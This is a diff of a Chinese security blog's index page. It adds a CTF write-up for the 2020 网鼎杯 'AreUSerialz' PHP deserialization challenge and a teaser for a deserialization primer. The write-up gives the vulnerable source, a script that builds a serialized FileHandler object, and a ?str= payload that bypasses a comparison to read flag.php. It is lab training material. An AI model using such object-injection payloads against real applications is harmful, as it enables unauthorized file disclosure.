@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -162,7 +162,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -179,6 +179,202 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yuanjiu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/" class="post-title-link" itemprop="url">2020-网鼎杯-青龙组-Web-AreUSerialz</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-11 18:45:40 / 修改时间：19:05:19" itemprop="dateCreated datePublished" datetime="2023-02-11T18:45:40+08:00">2023-02-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index"><span itemprop="name">实践</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>知识点：php代码审计，魔术方法，php反序列化，弱类型绕过</p>
+<p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//包含flag.php,显然要读取这个文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//类</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//构造函数，创建对象时触发其中内容，所以我们要构造一个类来触发</span></span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//让op == &quot;2&quot;来触发下面的读取函数</span></span><br><span class="line">      <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();<span class="comment">//读取函数</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数,销毁类的时候，也就是在最后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//===弱类型，强制将2转换为1，所以考虑绕过，加空格 op =‘ 2‘</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);<span class="comment">//反序列化，所以要先将对象序列化</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ctfhub靶场实操：</p>
+<p>开启容器：</p>
+<img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/2020-网鼎杯-青龙组-Web-AreUSerialz/image-20230211185729917.png" alt="image-20230211185729917" style="zoom:50%;">
+
+<p>给出源代码：</p>
+<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211185816020.png" alt="image-20230211185816020"></p>
+<p>根据前文代码审计编写php脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot; &quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot;%202&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;%20&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拼接：</p>
+<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190135812.png" alt="image-20230211190135812"></p>
+<p>查看源码：</p>
+<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190155840.png" alt="image-20230211190155840"></p>
+<p>得到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yuanjiu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">反序列化</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-02-10 15:00:50" itemprop="dateCreated datePublished" datetime="2023-02-10T15:00:50+08:00">2023-02-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-02-11 19:05:24" itemprop="dateModified" datetime="2023-02-11T19:05:24+08:00">2023-02-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>序列化：</strong>序列化是将变量或对象转换成字符串的过程，用于存储或传递的值的过程中，同时不丢失其类型和结构。</p>
+<p><strong>反序列化：</strong>反序列化是将字符串转换成变量或对象的过程</p>
+<p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210150104844.png" alt="image-20230210150104844"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -224,7 +420,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-11 14:52:31" itemprop="dateModified" datetime="2023-02-11T14:52:31+08:00">2023-02-11</time>
+      <time title="修改时间：2023-02-11 19:05:26" itemprop="dateModified" datetime="2023-02-11T19:05:26+08:00">2023-02-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -903,107 +1099,9 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="yuanjiu">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="元酒InfoSec">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 元酒InfoSec">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">第一篇博客</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-03 23:24:20" itemprop="dateCreated datePublished" datetime="2023-02-03T23:24:20+08:00">2023-02-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-07 15:29:49" itemprop="dateModified" datetime="2023-02-07T15:29:49+08:00">2023-02-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>第一次建立属于自己的博客，感觉真不错。</p>
-<h3 id="记录一下博客的制作过程"><a href="#记录一下博客的制作过程" class="headerlink" title="记录一下博客的制作过程"></a>记录一下博客的制作过程</h3><ul>
-<li><p><input checked disabled type="checkbox"> 
-算了，好麻烦，不想写了，直接见参考文章。</p>
-</li>
-<li><p><input disabled type="checkbox"> 
-有时间再写吧</p>
-</li>
-</ul>
-<p><img src="/2023/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/1.png" alt=" "></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
 
 </div>
   </main>
